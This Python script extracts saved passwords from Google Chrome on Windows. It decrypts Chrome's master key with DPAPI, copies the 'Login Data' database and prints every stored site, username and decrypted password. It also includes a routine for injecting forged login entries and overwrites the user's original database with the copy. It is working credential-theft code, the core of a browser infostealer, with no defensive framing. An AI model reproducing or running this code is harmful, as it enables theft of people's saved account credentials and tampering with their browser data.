import os
import json
import shutil
import base64
import sqlite3
import datetime
import win32crypt #pip install pypiwin32
from Crypto.Cipher import AES #pip install pycryptodome

def get_encryption_key():
    local_state_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData", "Local", "Google", "Chrome",
        "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = file.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def get_chrome_datetime_encryption():
    datetime_now = datetime.datetime.now()
    datetime_chromedate = datetime.datetime(1601, 1, 1)
    datetime_difference = datetime_now - datetime_chromedate
    date_time_total_seconds = int(datetime_difference.total_seconds())
    datetime_microsecond = datetime_now.microsecond
    datetime_encryption = str(date_time_total_seconds)+ str(datetime_microsecond)
    return int(datetime_encryption)

def get_chrome_datetime_decryption(datetime_encryption):
    datetime_chromedate = datetime.datetime(1601, 1, 1)
    datetime_timedelta = datetime.timedelta(microseconds = int(datetime_encryption))
    return datetime_chromedate + datetime_timedelta

def get_path_login_data():
    return os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")

def copy_db_login_data():
    db_login_data_path = get_path_login_data()
    filename_db_login_data = "Login Data"
    shutil.copyfile(db_login_data_path, filename_db_login_data)
    return filename_db_login_data

def encrypt_password(password, key):
    # generate a random initialization vector
    iv = os.urandom(12)
    # create cipher object using AES in GCM mode
    cipher = AES.new(key, AES.MODE_GCM, iv)
    # encrypt password
    encrypted_password, tag = cipher.encrypt_and_digest(password.encode())
    # concatenate initialization vector and encrypted password
    encrypted_data = os.urandom(3) + iv + encrypted_password + os.urandom(16)#b"\xefN\xf8\xf7\xb9\x8d\x1c\xd9\xa5$\x1b.~\x81\xff'"
    # return encrypted data as bytes object
    return encrypted_data

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:-16]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.encrypt(password).decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""

def insert_logins_table(origin_url, username_value, password, key, cursor, db):
    origin_url_logins = origin_url
    action_url_logins = ''
    username_element_logins = ''
    username_value_logins = username_value
    password_element_logins = ''
    password_value_logins = encrypt_password(password, key)
    submit_element_logins = ''
    signon_realm_logins = origin_url
    date_created_logins = get_chrome_datetime_encryption()
    blacklisted_by_user_logins = 0
    scheme_logins = 0
    password_type_logins = 3
    times_used_logins = 0
    form_data_logins = bytearray((32,0,0,0,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,4,0,0,0,110,117,108,108))
    display_name_logins = ''
    icon_url_logins = ''
    federation_url_logins = ''
    skip_zero_click_logins = 0
    generation_upload_status_logins = 0
    possible_username_pairs_logins = bytearray((0,0,0,0))
    date_last_used_logins = 0
    moving_blocked_for_logins = bytearray((0,0,0,0))
    date_password_modified_logins = date_created_logins
    
    sql = """INSERT INTO logins (origin_url, action_url, username_element, username_value, password_element,
           password_value, submit_element, signon_realm, date_created, blacklisted_by_user,
           scheme, password_type, times_used, form_data, display_name, icon_url,
           federation_url, skip_zero_click, generation_upload_status,
           possible_username_pairs, date_last_used, moving_blocked_for, date_password_modified)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"""
    val = (origin_url_logins, action_url_logins, username_element_logins, username_value_logins, password_element_logins,
           password_value_logins, submit_element_logins, signon_realm_logins, date_created_logins, blacklisted_by_user_logins,
           scheme_logins, password_type_logins, times_used_logins, form_data_logins, display_name_logins, icon_url_logins,
           federation_url_logins, skip_zero_click_logins, generation_upload_status_logins, possible_username_pairs_logins,
           date_last_used_logins, moving_blocked_for_logins, date_password_modified_logins)
    cursor.execute(sql, val)
    db.commit()


def main():
    # get the AES key
    key = get_encryption_key()

    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = copy_db_login_data()

    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    #If the data is duplicated, the function will not work.
    try:
        pass
        #insert_logins_table("https://www.exampleUrl.com/", "exampleUsername", "examplePassword", key, cursor, db)
    except:
        pass
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            print(f"Origin URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")
        else:
            continue
        if date_created != 86400000000 and date_created:
            print(f"Creation date: {str(get_chrome_datetime_decryption(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            print(f"Last Used: {str(get_chrome_datetime_decryption(date_last_used))}")
        print("="*50)
    cursor.close()
    db.close()
    try:
        db_login_data_path = get_path_login_data()
        os.replace(filename, get_path_login_data())
    except:
        try:
            # try to remove the copied db file
            os.remove(filename)
        except:
            pass
if __name__ == "__main__":
    main()
